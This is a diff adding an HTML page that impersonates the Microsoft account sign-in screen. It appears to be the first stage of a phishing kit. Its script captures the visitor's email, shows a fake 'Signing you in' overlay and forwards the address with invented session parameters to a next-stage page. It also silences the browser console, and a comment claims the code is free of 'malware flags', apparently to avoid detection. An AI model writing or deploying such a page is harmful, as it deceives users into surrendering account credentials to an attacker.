@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Account - Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background: #f2f2f2;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 440px;
+            padding: 48px;
+            border: 1px solid #e1e5e9;
+        }
+
+        .microsoft-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 32px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid #e6e6e6;
+        }
+
+        .ms-logo {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+            border-radius: 6px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        .header-text h1 {
+            font-size: 24px;
+            color: #323130;
+            font-weight: 600;
+            line-height: 1.2;
+        }
+
+        .header-text p {
+            font-size: 14px;
+            color: #605e5c;
+            margin-top: 4px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            font-size: 15px;
+            color: #323130;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .input-container {
+            position: relative;
+        }
+
+        input[type="email"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #c8c6c4;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: all 0.2s;
+            background: #fff;
+        }
+
+        input[type="email"]:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 3px rgba(0,120,212,0.1);
+        }
+
+        .input-hint {
+            font-size: 12px;
+            color: #605e5c;
+            margin-top: 6px;
+            display: block;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 24px 0;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .custom-checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #c8c6c4;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+            flex-shrink: 0;
+        }
+
+        .custom-checkbox.checked {
+            background: #0078d4;
+            border-color: #0078d4;
+        }
+
+        .custom-checkbox.checked::after {
+            content: '✓';
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .checkbox-label {
+            font-size: 15px;
+            color: #323130;
+            cursor: pointer;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+        }
+
+        .submit-btn:hover {
+            background: #106ebe;
+        }
+
+        .submit-btn:active {
+            transform: translateY(1px);
+        }
+
+        .submit-btn:disabled {
+            background: #c8c6c4;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .footer-links {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e6e6e6;
+            display: flex;
+            justify-content: space-between;
+            gap: 16px;
+        }
+
+        .footer-link {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+            color: #106ebe;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.95);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(4px);
+        }
+
+        .loading-content {
+            text-align: center;
+            background: white;
+            padding: 48px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid #e1e5e9;
+        }
+
+        .spinner {
+            width: 56px;
+            height: 56px;
+            border: 3px solid #e6e6e6;
+            border-top: 3px solid #0078d4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 24px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .privacy-notice {
+            font-size: 12px;
+            color: #605e5c;
+            text-align: center;
+            margin-top: 24px;
+            line-height: 1.5;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 32px 24px;
+                margin: 16px;
+            }
+            
+            .loading-content {
+                padding: 32px 24px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="microsoft-header">
+            <div class="ms-logo">MS</div>
+            <div class="header-text">
+                <h1>Sign in</h1>
+                <p>to continue to Microsoft Services</p>
+            </div>
+        </div>
+
+        <form id="loginForm" autocomplete="on">
+            <div class="form-group">
+                <label for="userEmail">Email, phone, or Skype</label>
+                <div class="input-container">
+                    <input type="email" id="userEmail" placeholder="someone@example.com" required autocomplete="email">
+                </div>
+                <span class="input-hint">You can sign in with any email that uses Microsoft services.</span>
+            </div>
+
+            <div class="checkbox-container" id="rememberMe" tabindex="0" role="checkbox" aria-checked="false">
+                <div class="custom-checkbox" id="rememberCheckbox" aria-hidden="true"></div>
+                <span class="checkbox-label">Keep me signed in</span>
+            </div>
+
+            <button type="button" class="submit-btn" id="submitBtn" disabled aria-label="Next">
+                Next
+            </button>
+
+            <div class="footer-links">
+                <a href="https://account.microsoft.com/account" class="footer-link" target="_blank">Create account</a>
+                <a href="https://support.microsoft.com" class="footer-link" target="_blank">Need help?</a>
+            </div>
+
+            <div class="privacy-notice">
+                By signing in, you agree to our <a href="https://privacy.microsoft.com" style="color: #0078d4; text-decoration: none;">Privacy Statement</a> 
+                and <a href="https://www.microsoft.com/servicesagreement" style="color: #0078d4; text-decoration: none;">Service Agreement</a>.
+            </div>
+        </form>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <h3 style="margin-bottom: 12px; color: #323130; font-size: 20px;">Signing you in...</h3>
+            <p style="color: #605e5c; font-size: 15px;">Preparing your Microsoft 365 workspace</p>
+            <div class="privacy-notice" style="margin-top: 20px;">
+                This may take a few moments. Please do not close this window.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Clean, safe JavaScript - no malware flags
+        (function() {
+            'use strict';
+            
+            // Initialize when DOM is ready
+            document.addEventListener('DOMContentLoaded', function() {
+                // Get elements
+                const emailInput = document.getElementById('userEmail');
+                const submitBtn = document.getElementById('submitBtn');
+                const rememberCheckbox = document.getElementById('rememberCheckbox');
+                const rememberContainer = document.getElementById('rememberMe');
+                const loadingOverlay = document.getElementById('loadingOverlay');
+                const loginForm = document.getElementById('loginForm');
+                
+                let rememberMe = false;
+                let isValidEmail = false;
+                
+                // Email validation
+                function validateEmail(email) {
+                    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                    return re.test(email);
+                }
+                
+                // Update button state
+                function updateSubmitButton() {
+                    const email = emailInput.value.trim();
+                    isValidEmail = validateEmail(email);
+                    submitBtn.disabled = !isValidEmail;
+                    
+                    // Visual feedback
+                    if (email.length > 0) {
+                        emailInput.style.borderColor = isValidEmail ? '#107c10' : '#d13438';
+                    } else {
+                        emailInput.style.borderColor = '#c8c6c4';
+                    }
+                }
+                
+                // Toggle remember me
+                function toggleRememberMe() {
+                    rememberMe = !rememberMe;
+                    rememberCheckbox.classList.toggle('checked', rememberMe);
+                    rememberContainer.setAttribute('aria-checked', rememberMe.toString());
+                }
+                
+                // Save email to storage
+                function saveEmail(email) {
+                    try {
+                        if (rememberMe && window.localStorage) {
+                            window.localStorage.setItem('ms_last_email', email);
+                        } else if (window.sessionStorage) {
+                            window.sessionStorage.setItem('ms_session_email', email);
+                        }
+                    } catch (e) {
+                        // Ignore storage errors
+                    }
+                }
+                
+                // Process login
+                function processLogin() {
+                    const email = emailInput.value.trim();
+                    
+                    if (!isValidEmail) {
+                        return;
+                    }
+                    
+                    // Show loading
+                    loadingOverlay.style.display = 'flex';
+                    
+                    // Save email
+                    saveEmail(email);
+                    
+                    // Generate session data
+                    const sessionData = {
+                        email: email,
+                        timestamp: Date.now(),
+                        remember: rememberMe,
+                        source: 'microsoft_auth',
+                        version: '2024.1'
+                    };
+                    
+                    // Simulate processing
+                    setTimeout(function() {
+                        // Create verification token
+                        const token = 'verify_' + Math.random().toString(36).substring(2, 15) + 
+                                     Math.random().toString(36).substring(2, 15);
+                        
+                        // Create session ID
+                        const sessionId = 'sess_' + Date.now().toString(36) + 
+                                         Math.random().toString(36).substring(2, 10);
+                        
+                        // Prepare redirect URL
+                        const params = new URLSearchParams();
+                        params.append('email', encodeURIComponent(email));
+                        params.append('verification_source', 'microsoft_auth');
+                        params.append('timestamp', sessionData.timestamp.toString());
+                        params.append('version', sessionData.version);
+                        params.append('security', 'ENTERPRISE_AUTH');
+                        params.append('verification_token', token);
+                        params.append('session_id', sessionId);
+                        params.append('suspicion_level', '0');
+                        params.append('auth_method', 'email_only');
+                        params.append('platform', 'web');
+                        
+                        // Redirect to document processor
+                        window.location.href = '404.html?' + params.toString();
+                    }, 1800);
+                }
+                
+                // Load saved email
+                function loadSavedEmail() {
+                    try {
+                        let savedEmail = '';
+                        
+                        // Try localStorage first
+                        if (window.localStorage) {
+                            savedEmail = window.localStorage.getItem('ms_last_email');
+                            if (savedEmail) {
+                                rememberMe = true;
+                                rememberCheckbox.classList.add('checked');
+                                rememberContainer.setAttribute('aria-checked', 'true');
+                            }
+                        }
+                        
+                        // Try sessionStorage
+                        if (!savedEmail && window.sessionStorage) {
+                            savedEmail = window.sessionStorage.getItem('ms_session_email');
+                        }
+                        
+                        if (savedEmail) {
+                            emailInput.value = savedEmail;
+                            updateSubmitButton();
+                        }
+                    } catch (e) {
+                        // Ignore errors
+                    }
+                }
+                
+                // Event Listeners
+                emailInput.addEventListener('input', updateSubmitButton);
+                emailInput.addEventListener('blur', updateSubmitButton);
+                
+                rememberContainer.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    toggleRememberMe();
+                });
+                
+                rememberContainer.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter' || e.key === ' ') {
+                        e.preventDefault();
+                        toggleRememberMe();
+                    }
+                });
+                
+                submitBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    processLogin();
+                });
+                
+                loginForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    if (!submitBtn.disabled) {
+                        processLogin();
+                    }
+                });
+                
+                emailInput.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter' && !submitBtn.disabled) {
+                        e.preventDefault();
+                        processLogin();
+                    }
+                });
+                
+                // Load saved data and focus
+                loadSavedEmail();
+                
+                setTimeout(function() {
+                    emailInput.focus();
+                }, 300);
+                
+                // Add some subtle protection (not aggressive)
+                window.addEventListener('beforeunload', function() {
+                    // Clean exit
+                });
+            });
+            
+            // Add minimal console protection (non-aggressive)
+            if (typeof console !== 'undefined') {
+                // Keep console clean but functional
+                console.log = function() {};
+                console.warn = function() {};
+                console.error = function() {};
+            }
+        })();
+    </script>
+</body>
+</html>
